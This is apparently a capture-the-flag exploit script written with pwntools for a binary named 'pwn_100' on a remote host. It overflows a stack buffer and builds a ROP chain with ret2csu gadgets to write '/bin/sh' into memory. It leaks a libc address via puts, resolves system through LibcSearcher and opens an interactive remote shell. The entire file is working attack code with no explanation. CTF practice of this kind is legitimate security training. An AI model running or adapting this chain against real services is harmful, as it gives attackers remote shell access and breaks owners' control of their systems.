from pwn import*
from LibcSearcher import LibcSearcher
p = remote('111.198.29.45',32858)
#p = process('./pwn_100')
elf = ELF('./pwn_100')
context.log_level = 'debug'
puts_plt = elf.plt['puts']
start_main_got = elf.got['__libc_start_main']
read_got = elf.got['read']
start_addr = 0x400550
binsh_addr = 0x00601000
gadget1_addr = 0x40075A
gadget2_addr = 0x400740
pop_rdi_ret  = 0x400763 
payload = 'Z'*0x40 + p64(0)+ p64(gadget1_addr) + p64(0) + p64(1) + p64(read_got) + p64(9)+p64(binsh_addr) +p64(0) + p64(gadget2_addr) + p64(0) * (6 + 1)+ p64(start_addr)
payload = payload.ljust(199,'Z')
p.send(payload)
p.sendlineafter('bye~\n','/bin/sh\x00')
payload2 = 'Z'*0x40 + p64(0) + p64(pop_rdi_ret) + p64(start_main_got) + p64(puts_plt) + p64(start_addr)
payload2 = payload2.ljust(199,'Z')
p.sendline(payload2)
p.recvline()
start_main_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
libc = LibcSearcher('__libc_start_main', start_main_addr)
libcbase = start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
rop = 'Z'*0x40 + p64(0)+ p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
rop = rop.ljust(199,'Z')
p.sendline(rop)
p.interactive()
